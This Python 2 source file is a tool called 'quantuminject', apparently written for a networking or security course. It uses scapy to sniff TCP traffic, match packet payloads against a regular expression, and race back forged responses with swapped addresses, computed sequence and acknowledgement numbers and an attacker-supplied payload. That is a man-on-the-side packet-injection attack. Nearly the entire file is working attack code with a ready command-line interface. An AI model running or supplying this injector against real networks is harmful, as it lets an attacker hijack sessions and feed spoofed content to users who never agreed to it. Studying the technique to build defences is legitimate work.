__author__ = 'Hyungjoon Koo (hykoo@cs.stonybrook.edu)'

import optparse
import os
import sys
import re
import random
import logging
from datetime import *
from copy import deepcopy
import util

try:
    import netifaces
    from scapy.all import *
except ImportError:
    print 'Failed to import necessary packages'

VER = 0.3
PKT_MONITOR_CNT = 20    # Default number of packets to be monitored

class InjectorError:
    pass
    
class Injector:
    def __init__(self, iface, pattern, data, filter):
        self.iface = iface
        self.pattern = pattern
        self.data = data
        self.filter = filter
        self.injected_cnt = 0
        
    def get_injected_pkt_cnt(self):
        return self.injected_cnt
        
    def check_pattern(self, pkt):
        try:
            p = re.compile(str(self.pattern))
        except:
            logging.error("Regular expression is NOT valid!")
            sys.exit(1)
        return p.search(str(pkt[TCP].payload))

    def packet_builder(self, pkt):
    
        # Build a forged packet with necessary changes based on original packet copy
        forged_pkt = deepcopy(pkt)
        
        # Construct the Ethernet header
        forged_pkt[Ether].src, forged_pkt[Ether].dst = pkt[Ether].dst, pkt[Ether].src   # Exchange MACs
        
        # Construct the IP header
        forged_pkt[IP].id = random.randint(5000, 50000)  # Random number btn [0, 2^16]
        forged_pkt[IP].src, forged_pkt[IP].dst = pkt[IP].dst, pkt[IP].src  # Exchange IPs
        forged_pkt[IP].ttl = 64     # Does not matter
        
        # Construct the TCP header
        forged_pkt[TCP].sport, forged_pkt[TCP].dport = pkt[TCP].dport, pkt[TCP].sport   # Exchange Ports
        forged_pkt[TCP].seq = pkt.ack
        forged_pkt[TCP].ack = pkt.seq + (pkt.len - pkt[IP].ihl * 4 - 20) # Original packet length - (size_ip + size_tcp)
        forged_pkt[TCP].flags = 'PA'
        forged_pkt[TCP].window = 65000   # Does not matter
        forged_pkt[TCP].payload = self.data
        
        '''
        # !! Another way of building a forged packet by each individual layer of network stack 
        # Define the packet to be injected
        ether, ip, tcp = Ether(), IP(), TCP()
        
        # Construct the Ethernet header
        ether.src, ether.dst = pkt[Ether].dst, pkt[Ether].src
        ether.type = 0x0800
        
        # Construct the IP header
        ip.ihl = pkt.ihl
        ip.tos = pkt.tos
        ip.flags = pkt.flags
        ip.frag = pkt.frag      # 'DF' : Don't Fragment
        ip.id = random.randint(5000, 50000)  # Random number btn [0, 2^16]
        ip.src, ip.dst = pkt[IP].dst, pkt[IP].src
        ip.chksum = 0
        
        # Construct the TCP header
        tcp_seg_len = pkt.len - 40      # TCP segment length = total IP len - (TCP/IP hdr len)
        tcp.sport, tcp.dport = pkt.dport, pkt.sport
        tcp.dataofs = pkt.dataofs
        tcp.seq = pkt.ack
        tcp.ack = pkt.seq + tcp_seg_len
        tcp.flags = "SA"
        tcp.window = 1000
        tcp.chksum = 0
        
        # Build the entire packet
        forged_pkt = ether/ip/tcp/self.data
        '''
        
        # Build the forged packet to inject (SYN for target packet)
        del(forged_pkt[IP].len)         # Recalculate the length of IP
        del(forged_pkt[IP].chksum)      # Recalculate the checksum of IP
        del(forged_pkt[TCP].chksum)     # Recalculate the checksum of TCP
        
        print "\t\t(%d) Injected packet IP ID: %d (corresponding %d)" \
              % (self.injected_cnt+1, forged_pkt[IP].id, pkt[IP].id)
        return forged_pkt

    def injection(self, pkt):
        match = self.check_pattern(pkt)
        
        # If the pattern is found, inject the forged packet!
        if match is None:
            pass
        else:
            logging.warning("Pattern (%s) found in the packet IPID: %d" % (self.pattern, pkt[IP].id))
            sendp(self.packet_builder(pkt), verbose=False)
            self.injected_cnt += 1
            logging.warning("Injected the forged packet successfully! (MotS)")
                    
    def sniff_n_inject(self, cnt = 10):
        try:
            bpf = self.filter
            # x.sprintf("%IP.src%: %TCP.sport%")
            # pkts = sniff(offline="temp.cap")
            logging.info("Sniffing on %s" % self.iface)
            sniff(iface=self.iface, filter=bpf, count=cnt, prn=lambda x: self.injection(x), lfilter=lambda x:x.haslayer(TCP))
        
        except InjectorError:
            logging.error("Either filter or regular expression error!")
            sys.exit(1)

if __name__ == '__main__':
    usage  = "Usage: %prog -i <interface> -r <regex> -d <data> -b <bpf> (Use -h for help)"
    usage += "\n   eg: %prog -i eth0 -r 'w?rks' -d sample.txt -b tcp"
    version = "%prog " + str(VER)
    
    p = optparse.OptionParser(usage=usage, version=version)
    
    p.add_option("-i", "--interface", dest="iface", action="store_true", 
                  help="interface of network device to listen on")

    p.add_option("-r", "--regex", dest="regex", action="store_true", 
                  help="regular expression to match the request packets for being spoofed")
                      
    p.add_option("-d", "--datafile", dest="data", action="store_true",
                      help="raw data to be used as TCP payload of the spoofed response")
                      
    p.add_option("-b", "--filter", dest="bpf", action="store_true", 
                      help="BPF filter that specifies a subset of the traffic to be monitored")
    
    print "quantuminject %s" % VER
    
    # Check provided arguments from command line
    try:
        (options, args) = p.parse_args()
        if len(args) != 4:
            logging.error('Double-check your arguments!')
            sys.exit(1)
    except:
        logging.error("Something went wrong!!")
        sys.exit(1)

    logging.basicConfig(filename='injection.log', level=logging.DEBUG)
    logging.info('[Start] %s' % datetime.today().strftime("%B %d %Y %I:%M%p (%A)"))
    
    # Setup arguments o/w default values
    iface = util.ifce_sanity_check(args[0]) if options.iface else util.get_default_iface()
    pattern = args[1] if options.regex else 'works'
    data = util.data_sanity_check(args[2]) if options.data else 'xxx'
    filter = args[3] if options.bpf else 'tcp'
    
    util.print_injection_info(iface, pattern, args[2], len(data), filter)
    ij = Injector(iface, pattern, data, filter)
    ij.sniff_n_inject(PKT_MONITOR_CNT)
    
    print '\t%d packets are injected! (%d monitored)' % (ij.get_injected_pkt_cnt(), PKT_MONITOR_CNT)
    logging.info('[End] %s' % datetime.today().strftime("%B %d %Y %I:%M%p (%A)"))
    